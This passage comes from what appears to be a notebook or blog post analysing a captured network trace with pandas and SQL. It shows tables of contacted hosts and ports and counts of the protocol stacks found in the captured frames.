      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>89</th>
      <td>    1000</td>
      <td>               gwp.nuggad.net</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>90</th>
      <td>     950</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>91</th>
      <td>     925</td>
      <td>             e13.whatsapp.net</td>
      <td> 5222</td>
      <td> sll:ip:tcp:xmpp</td>
    </tr>
    <tr>
      <th>92</th>
      <td>     900</td>
      <td>   android.clients.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>93</th>
      <td>     900</td>
      <td>             www.theverge.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>94</th>
      <td>     900</td>
      <td>                tags.w55c.net</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>95</th>
      <td>     825</td>
      <td>              ssl.gstatic.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>96</th>
      <td>     825</td>
      <td>             intelcrawler.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>97</th>
      <td>     800</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>98</th>
      <td>     750</td>
      <td>                pbs.twimg.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>99</th>
      <td>     750</td>
      <td>               images.zeit.de</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p_testing = pdsql.read_frame(&#34;&#34;&#34; 
    SELECT  frame_number, frame_protocols
    FROM connection
    WHERE frame_protocols LIKE &#39;sll:ip:tcp%xml%&#39;
    GROUP by frame_protocols
    ORDER by 1 DESC
&#34;&#34;&#34;, con)
#print(p1.head(100).to_string())
p_testing.head(100)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>frame_number</th>
      <th>frame_protocols</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> 111438</td>
      <td>                     sll:ip:tcp:xmpp:xml</td>
    </tr>
    <tr>
      <th>1</th>
      <td>  98738</td>
      <td>           sll:ip:tcp:http:data:data:xml</td>
    </tr>
    <tr>
      <th>2</th>
      <td>  98624</td>
      <td> sll:ip:tcp:http:data:data:data:data:xml</td>
    </tr>
    <tr>
      <th>3</th>
      <td>  83057</td>
      <td>                     sll:ip:tcp:http:xml</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><h1 id="used-protocols">Used protocols</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p_proto = pdsql.read_frame(&#34;&#34;&#34; 
    SELECT COUNT(frame_protocols), frame_protocols
    FROM connection
    GROUP by frame_protocols
    ORDER BY 1 DESC
&#34;&#34;&#34;, con)
p_proto.head(100)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>COUNT(frame_protocols)</th>
      <th>frame_protocols</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td> 529265</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        sll:ip:tcp</td>
    </tr>
    <tr>
      <th>1 </th>
      <td> 103200</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>2 </th>
      <td>  19620</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>3 </th>
      <td>  15055</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    sll:ip:udp:dns</td>
    </tr>
    <tr>
      <th>4 </th>
      <td>   9130</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                sll:ip:tcp:ssl:ssl</td>
    </tr>
    <tr>
      <th>5 </th>
      <td>   3710</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   sll:ip:tcp:xmpp</td>
    </tr>
    <tr>
      <th>6 </th>
      <td>   2785</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   sll:ip:tcp:data</td>
    </tr>
    <tr>
      <th>7 </th>
      <td>   1935</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        sll:ip:tcp:http:image-jfif</td>
    </tr>
    <tr>
      <th>8 </th>
      <td>   1910</td>
      <td>         sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:logotypecertextn:x509ce:x509sat:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:logotypecertextn:pkix1implicit:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>9 </th>
      <td>   1100</td>
      <td>                                                                                                                                                                                  sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1implicit:x509ce:x509ce:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>10</th>
      <td>    870</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   sll:ip:tcp:http:data-text-lines</td>
    </tr>
    <tr>
      <th>11</th>
      <td>    505</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             sll:ip:tcp:http:media</td>
    </tr>
    <tr>
      <th>12</th>
      <td>    480</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               sll:ip:tcp:http:png</td>
    </tr>
    <tr>
      <th>13</th>
      <td>    395</td>
      <td>                                       sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1implicit:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>14</th>
      <td>    335</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                               sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkcs-1</td>
    </tr>
    <tr>
      <th>15</th>
      <td>    320</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         sll:ip:tcp:http:image-gif</td>
    </tr>
    <tr>
      <th>16</th>
      <td>    265</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            sll:ip:icmp:ip:udp:dns</td>
    </tr>
    <tr>
      <th>17</th>
      <td>    205</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              sll:ip:tcp:http:data</td>
    </tr>
    <tr>
      <th>18</th>
      <td>    165</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     sll:ip:tcp:http:data:data:xml</td>
    </tr>
    <tr>
      <th>19</th>
      <td>    145</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         sll:ip:tcp:http:data:data:data-text-lines</td>
    </tr>
    <tr>
      <th>20</th>
      <td>    130</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    sll:ip:tcp:http:data:data:json</td>
    </tr>
    <tr>
      <th>21</th>
      <td>     95</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              sll:ip:tcp:http:json</td>
    </tr>
    <tr>
      <th>22</th>
      <td>     85</td>
      <td>                                                                                                                                                            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkix1explicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>23</th>
      <td>     85</td>
      <td>                                                                                                                                                                             sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:logotypecertextn:x509ce:x509sat:x509ce:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>24</th>
      <td>     75</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           sll:ip:tcp:http:data:data:data:data:xml</td>
    </tr>
    <tr>
      <th>25</th>
      <td>     65</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    sll:ip:tcp:http:data:data:data:data-text-lines</td>
    </tr>
    <tr>
      <th>26</th>
      <td>     60</td>
      <td>                                                                                                                                                                           sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1implicit:x509ce:x509ce:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>27</th>
      <td>     55</td>
      <td>                                                                                                                                                  sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:ns_cert_exts:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509sat:x509sat:x509sat:x509sat:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>28</th>
      <td>     55</td>
      <td>                                                                                                      sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:logotypecertextn:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:ns_cert_exts:logotypecertextn:x509ce:x509sat:pkix1implicit:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>29</th>
      <td>     45</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               sll:ip:tcp:http:xml</td>
    </tr>
    <tr>
      <th>30</th>
      <td>     40</td>
      <td>                                                                                                                                                                                      sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1implicit:x509ce:x509ce:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkcs-1</td>
    </tr>
    <tr>
      <th>31</th>
      <td>     35</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               sll:ip:tcp:xmpp:xml</td>
    </tr>
    <tr>
      <th>32</th>
      <td>     30</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          sll:ip:tcp:http:data:data:data:image-gif</td>
    </tr>
    <tr>
      <th>33</th>
      <td>     30</td>
      <td>                                                                                                                                                                                     sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:logotypecertextn:x509ce:x509sat:x509ce:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>34</th>
      <td>     25</td>
      <td>                                                                                                                                                                                                                                                                                         sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkix1explicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>35</th>
      <td>     20</td>
      <td>                                                                                                                                                                                                                sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>36</th>
      <td>     15</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               sll:ip:tcp:http:data:data:data:data:data-text-lines</td>
    </tr>
    <tr>
      <th>37</th>
      <td>     15</td>
      <td>                                                                                                                                                 sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:ns_cert_exts:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509sat:x509sat:x509sat:x509sat:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>38</th>
      <td>     15</td>
      <td>                                                                                           sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:x509ce:x509ce:x509sat:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>39</th>
      <td>     15</td>
      <td>                                                                                                                                                                                                                          sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>40</th>
      <td>     15</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    sll:ip:tcp:ulp</td>
    </tr>
    <tr>
      <th>41</th>
      <td>     10</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               sll:ip:tcp:http:data:data:data:json</td>
    </tr>
    <tr>
      <th>42</th>
      <td>     10</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              sll:ip:tcp:http:data:data:data:media</td>
    </tr>
    <tr>
      <th>43</th>
      <td>     10</td>
      <td>                                                                                                                                                                                                                                                                  sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>44</th>
      <td>     10</td>
      <td>                                                                                                                                                                    sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkix1explicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>45</th>
      <td>     10</td>
      <td>                                 sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1implicit:x509ce:x509ce:pkix1explicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509sat:x509sat:x509sat:x509sat:x509sat:x509ce:pkix1implicit:x509ce:x509ce:pkix1explicit:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>46</th>
      <td>     10</td>
      <td>                                                            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1implicit:x509ce:x509ce:x509ce:x509ce:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>47</th>
      <td>     10</td>
      <td>                                                                                                                                                                                                                        sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>48</th>
      <td>     10</td>
      <td> sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:logotypecertextn:x509ce:x509sat:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:logotypecertextn:pkix1implicit:x509ce:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>49</th>
      <td>     10</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    sll:ip:udp:ntp</td>
    </tr>
    <tr>
      <th>50</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     sll:ip:tcp:http:data:data:data:data:data:data:data-text-lines</td>
    </tr>
    <tr>
      <th>51</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                sll:ip:tcp:http:data:data:data:data:data:data:data:data-text-lines</td>
    </tr>
    <tr>
      <th>52</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                        sll:ip:tcp:http:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data-text-lines</td>
    </tr>
    <tr>
      <th>53</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                   sll:ip:tcp:http:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:png</td>
    </tr>
    <tr>
      <th>54</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              sll:ip:tcp:http:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:json</td>
    </tr>
    <tr>
      <th>55</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            sll:ip:tcp:http:data:data:data:data:data:data:data:data:data:data:json</td>
    </tr>
    <tr>
      <th>56</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 sll:ip:tcp:http:data:data:data:data:data:data:data:data:data:json</td>
    </tr>
    <tr>
      <th>57</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                sll:ip:tcp:http:data:data:data:data:data:data:json</td>
    </tr>
    <tr>
      <th>58</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               sll:ip:tcp:http:data:data:image-gif</td>
    </tr>
    <tr>
      <th>59</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     sll:ip:tcp:http:data:data:png</td>
    </tr>
    <tr>
      <th>60</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              sll:ip:tcp:http:json:data-text-lines</td>
    </tr>
    <tr>
      <th>61</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                 sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkix1explicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>62</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                             sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkix1explicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1</td>
    </tr>
    <tr>
      <th>63</th>
      <td>      5</td>
      <td>             sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:logotypecertextn:x509ce:x509sat:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:logotypecertextn:pkix1implicit:pkcs-1</td>
    </tr>
    <tr>
      <th>64</th>
      <td>      5</td>
